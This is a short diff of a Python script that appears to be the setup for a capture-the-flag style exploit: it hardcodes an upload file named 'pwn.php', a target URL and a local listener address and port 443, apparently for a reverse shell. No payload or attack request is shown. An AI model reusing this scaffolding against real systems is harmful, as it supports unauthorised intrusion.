@@ -11,16 +11,16 @@ def def_handler(sig, frame):
 # Ctrl+C
 signal.signal(signal.SIGINT, def_handler)
 
-if len(sys.argv) != 3:
-	log.failure("Uso: %s <ip-address> filename" % sys.argv[0])
+if len(sys.argv) != 2:
+	log.failure("Uso: %s <ip-address>" % sys.argv[0])
 	sys.exit(1)
 
 # Variables globales
-filename = sys.argv[2]
+filename = "pwn.php"
 ip_address = sys.argv[1]
 main_url = "http://%s/" % ip_address
 lport = 443
-lip_address = "10.0.0.1"
+lip_address = "10.10.10.10"
 
 def createFile():
 
